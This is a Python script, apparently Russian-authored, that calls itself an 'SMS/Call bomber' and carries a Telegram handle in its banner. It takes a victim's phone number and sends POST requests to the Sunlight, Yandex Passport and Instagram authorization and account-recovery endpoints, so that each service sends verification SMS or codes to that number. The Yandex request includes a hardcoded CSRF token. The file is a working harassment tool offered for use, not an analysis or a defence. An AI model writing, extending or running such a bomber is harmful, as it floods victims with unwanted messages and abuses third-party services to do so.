import os                                    
import random
import time
import requests
from termcolor import colored                   

# Дефы:
def logo():
    os.system("clear")
    print("\u001b[33m       ____  ____   _    __  __ ____      ")
    print("\u001b[33m      / ___||  _ \ / \  |  \/  |  _ \     ")
    print("\u001b[33m      \___ \| |_) / _ \ | |\/| | |_) |    ")     
    print("\u001b[33m       ___) |  __/ ___ \| |  | |  _ <     ")    
    print("\u001b[33m      |____/|_| /_/   \_\_|  |_|_| \_\    ")
    print("\u001b[33m                                          ")
    print("\u001b[32m   SMS/Call bomber. \u001b[34mTelegram: @BreadToBad\033[0m ")
    print("                                          ")        

def clear():
    os.system("clear")

# Начало кода:
logo()
_phone = int(input("\u001b[31mEnter number:\033[0m "))
logo()

if _phone <= 10000000000:
    print("\u001b[33m[!] \u001b[31mIncorrect number!\033[0m")
    print("")
    exit()

if _phone >= 100000000000:          
    print("\u001b[33m[!] \u001b[31mIncorrect number!\033[0m")
    print("")
    exit()

a  = requests.post("https://api.sunlight.net/v3/customers/authorization/", data={"phone": _phone})
print(a)

b =  requests.post("https://passport.yandex.ru/registration-validations/phone-confirm-code-submit", data={"csrf_token": "9cbcf73f17ab8ff6117ff98292d1a0f1e6f9bae3:1597829969871", "track_id": "15deb168f19ac62834bd899f9214648d50", "display_language": "ru", "number": _phone, "confirm_method": "by_sms"})
print(b)

c = requests.post("https://www.instagram.com/accounts/accounts_recovery_send_ajax", data={"email_or_username": _phone, "recaptcha_challenge_field": ""})
print(c)

exit()
